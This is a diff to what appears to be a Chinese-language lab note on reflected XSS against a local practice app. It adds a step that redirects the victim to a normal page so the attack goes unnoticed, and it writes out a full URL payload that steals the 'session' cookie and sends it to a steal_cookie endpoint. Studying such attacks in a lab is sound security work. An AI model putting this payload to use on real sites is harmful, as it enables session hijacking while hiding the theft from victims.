@@ -1111,7 +1111,11 @@ xmlhttp.onload = function () {
 };
 xmlhttp.send(); // this method is asynchronous! 
 ```
+- 可以重新定向到正常的url防止出现破绽
+```javascript
+window.location.replace("http://localhost:3000/profile?username=user1");
+```
 完整的url请求如下所示
 ```html
-http://localhost:3000/profile?username=<p hidden><script>function getCookie(name) {var value = "; ".concat(document.cookie);var parts = value.split("; ".concat(name).concat("="));if (parts.length == 2) return parts.pop().split(";").shift();}var stolenCookie = getCookie("session");var xmlhttp = new XMLHttpRequest();xmlhttp.open('GET', 'http://localhost:3000/steal_cookie?cookie='.concat(stolenCookie)); xmlhttp.onload = function () {};xmlhttp.send();</script>
+http://localhost:3000/profile?username=<p hidden><script>function getCookie(name) {var value = "; ".concat(document.cookie);var parts = value.split("; ".concat(name).concat("="));if (parts.length == 2) return parts.pop().split(";").shift();}var stolenCookie = getCookie("session");var xmlhttp = new XMLHttpRequest();xmlhttp.open('GET', 'http://localhost:3000/steal_cookie?cookie='.concat(stolenCookie)); xmlhttp.onload = function () {};xmlhttp.send();window.location.replace("http://localhost:3000/profile?username=user1");</script>
 ```
